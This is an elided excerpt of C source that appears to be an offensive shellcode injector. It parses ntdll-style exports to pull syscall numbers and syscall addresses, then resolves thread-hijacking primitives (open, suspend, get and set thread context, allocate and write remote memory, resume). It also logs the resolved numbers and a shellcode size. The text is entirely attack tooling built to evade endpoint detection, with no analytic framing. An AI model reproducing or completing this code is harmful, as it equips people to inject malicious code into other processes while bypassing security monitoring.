...
NtFunction GetFuncAddr(size_t modb, char* fn) {
	...
	for (size_t i = 0; i < exportTable->NumberOfNames; i++) {
		...
		if (!stricmp(name, fn)) {
			...
			result.ssn = ((DWORD*)(unsigned char*)(funcAddr + 4))[0];
			
			result.sysaddr = (UINT_PTR)funcAddr + 0x12;
...
int main(int argc, char* argv[]) {
	...
	NtFunction NtOpenThreadFunc = GetFuncAddr(kb, "NtOpenThread");
	NtFunction NtOpenProcessFunc = GetFuncAddr(kb, "NtOpenProcess");
	NtFunction NtSuspendThreadFunc = GetFuncAddr(kb, "NtSuspendThread");
	NtFunction NtGetContextThreadFunc = GetFuncAddr(kb, "NtGetContextThread");
	NtFunction NtAllocateVirtualMemoryFunc = GetFuncAddr(kb, "NtAllocateVirtualMemory");
	NtFunction NtWriteVirtualMemoryFunc = GetFuncAddr(kb, "NtWriteVirtualMemory");
	NtFunction NtSetContextThreadFunc = GetFuncAddr(kb, "NtSetContextThread");
	NtFunction NtResumeThreadFunc = GetFuncAddr(kb, "NtResumeThread");

	wrdNtOpenThread = (DWORD)NtOpenThreadFunc.ssn;
	wrdNtOpenProcess = (DWORD)NtOpenProcessFunc.ssn;
	wrdNtSuspendThread = (DWORD)NtSuspendThreadFunc.ssn;
	wrdNtGetContextThread = (DWORD)NtGetContextThreadFunc.ssn;
	wrdNtAllocateVirtualMemory = (DWORD)NtAllocateVirtualMemoryFunc.ssn;
	...
	g("size of shellcode: %d\n\n\n", sz);

	HANDLE hProc;
	HANDLE hThread;
	i("ssns for functions are below:");
	i("NtOpenProcess IS: 0x%x or %d", wrdNtOpenProcess, wrdNtOpenProcess);
	i("NtOpenThread IS: 0x%x or %d", wrdNtOpenThread, wrdNtOpenThread);
	i("NtSuspendThread IS: 0x%x or %d", wrdNtSuspendThread, wrdNtSuspendThread);
	i("NtGetContextThread IS: 0x%x or %d", wrdNtGetContextThread, wrdNtGetContextThread);
	i("NtAllocateVirtualMemory IS: 0x%x or %d", wrdNtAllocateVirtualMemory, wrdNtAllocateVirtualMemory);
	i("NtWriteVirtualMemory IS: 0x%x or %d", wrdNtWriteVirtualMemory, wrdNtWriteVirtualMemory);
	i("NtSetContextThread IS: 0x%x or %d", wrdNtSetContextThread, wrdNtSetContextThread);
	i("NtResumeThread IS: 0x%x or %d", wrdNtResumeThread, wrdNtResumeThread);
